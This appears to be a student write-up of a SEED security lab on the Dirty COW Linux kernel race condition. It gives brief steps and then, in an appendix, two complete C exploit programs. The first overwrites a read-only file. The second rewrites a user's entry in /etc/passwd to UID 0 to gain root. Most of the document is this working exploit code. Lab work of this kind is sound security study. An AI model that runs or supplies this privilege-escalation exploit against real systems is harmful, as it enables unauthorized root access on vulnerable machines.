# Dirty-COW-Attack-Lab
# Task 1: Modify a Dummy Read-Only File
Creating the dummy file “/zzz” using touch command. Changing the permission of file to “rw” for owner and “r” for users. 
- Using editor gedit to add random content to the /zzz file. 
- Viewing the file /zzz content using cat command.
- Checking the permission of file /zzz using the ls-l command. 
- Trying the add normal content to the file with the normal user. (without root permissions), but we wont be able to add because file only has the read permission for normal user.
- Creating the file cow_attack.c and adding the content downloaded from the seed lab webisite and pasting content in the file cow_attack.c 
- Compiling the file cow_attack.c using the gcc compiler. After that a.out file is created. 
- Executing the file. After waiting for couple of seconds we stop the execution loop. 
- Viewing the content of the file /zzz using the cat command. Its clearly visible the content of the file has been modified which means normal user having the read only access to the file, still able to write to the file using the dirty cow attack. 
Attack is successful. 

# Task 2: Modify the password file to gain the root privilege 
-Creating the new user named “Meet”
Also viewing the information in the /etc/passwd file using cat command.
- Creating the new attack file “attack_cow.c” in Desktop.
- Modifying the content of the file.
- Now, compiling the attack_cow.c file using gcc compiler. Executing and after waiting couple of seconds, we stop the loop. 
- Checking the content of the file, can see we are able to change the content of this file and able to make “meet” as the root. 
- Lastly, double checking the UID using the id command, which is also changed to the root. 
Dirty cow attack successful. 


# Lab Appendix 
1.	Code for cow_attack.c file 
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/zzz", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "222222");                        

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "******";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}

2.	Code for attack_cow.c file
3.	#include <sys/mman.h>
4.	#include <fcntl.h>
5.	#include <pthread.h>
6.	#include <sys/stat.h>
7.	#include <string.h>
8.	
9.	void *map;
10.	void *writeThread(void *arg);
11.	void *madviseThread(void *arg);
12.	
13.	int main(int argc, char *argv[])
14.	{
15.	  pthread_t pth1,pth2;
16.	  struct stat st;
17.	  int file_size;
18.	
19.	  // Open the target file in the read-only mode.
20.	  int f=open("/etc/passwd", O_RDONLY);
21.	
22.	  // Map the file to COW memory using MAP_PRIVATE.
23.	  fstat(f, &st);
24.	  file_size = st.st_size;
25.	  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
26.	
27.	  // Find the position of the target area
28.	  char *position = strstr(map, "meet:x:1001");                        
29.	
30.	  // We have to do the attack using two threads.
31.	  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
32.	  pthread_create(&pth2, NULL, writeThread, position);             
33.	
34.	  // Wait for the threads to finish.
35.	  pthread_join(pth1, NULL);
36.	  pthread_join(pth2, NULL);
37.	  return 0;
38.	}
39.	
40.	void *writeThread(void *arg)
41.	{
42.	  char *content= "meet:x:0000";
43.	  off_t offset = (off_t) arg;
44.	
45.	  int f=open("/proc/self/mem", O_RDWR);
46.	  while(1) {
47.	    // Move the file pointer to the corresponding position.
48.	    lseek(f, offset, SEEK_SET);
49.	    // Write to the memory.
50.	    write(f, content, strlen(content));
51.	  }
52.	}
53.	
54.	void *madviseThread(void *arg)
55.	{
56.	  int file_size = (int) arg;
57.	  while(1){
58.	      madvise(map, file_size, MADV_DONTNEED);
59.	  }
60.	}
